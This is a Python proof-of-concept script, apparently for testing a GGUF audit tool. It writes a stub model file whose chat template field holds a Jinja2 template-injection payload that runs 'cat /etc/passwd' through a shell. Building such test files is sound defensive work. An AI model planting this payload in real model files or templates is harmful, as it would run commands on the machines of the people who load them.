#!/usr/bin/env python3
# LCL Secure Lab - PoC: Malicious Chat Template Generator
# This script creates a stub GGUF file containing a suspicious Jinja2 template.
# Use this to test if your audit tools (like scripts/gguf_audit.py) can detect SSTI payloads.

import os
import sys

try:
    from gguf import GGUFWriter
    import numpy as np
except ImportError:
    print("[-] Error: Missing dependencies. Please run 'pip install gguf numpy'.")
    sys.exit(1)

def create_poc(output_path):
    print(f"[*] Generating PoC GGUF file: {output_path}")
    
    # This is a classic Jinja2 SSTI payload pattern often used in LLM chat templates.
    # It attempts to traverse the object hierarchy to find dangerous classes.
    poc_payload = "{{ ().__class__.__base__.__subclasses__()[408]('cat /etc/passwd', shell=True, stdout=-1).communicate()[0].strip() }}"
    
    writer = GGUFWriter(output_path, "llama")
    
    # Injecting the payload into a standard metadata field
    writer.add_string("tokenizer.chat_template", poc_payload)
    
    # Adding a dummy tensor to satisfy GGUF format requirements
    writer.add_tensor("token_embd.weight", np.zeros((1, 1), dtype=np.float32))
    
    writer.write_header_to_file()
    writer.write_kv_data_to_file()
    writer.write_tensors_to_file()
    writer.close()
    
    print(f"[+] PoC generated successfully at {output_path}")
    print("[*] Now run: python3 scripts/gguf_audit.py " + output_path)

if __name__ == "__main__":
    out_dir = "audit"
    if not os.path.exists(out_dir):
        os.makedirs(out_dir)
        
    poc_file = os.path.join(out_dir, "poc_malicious.gguf")
    create_poc(poc_file)
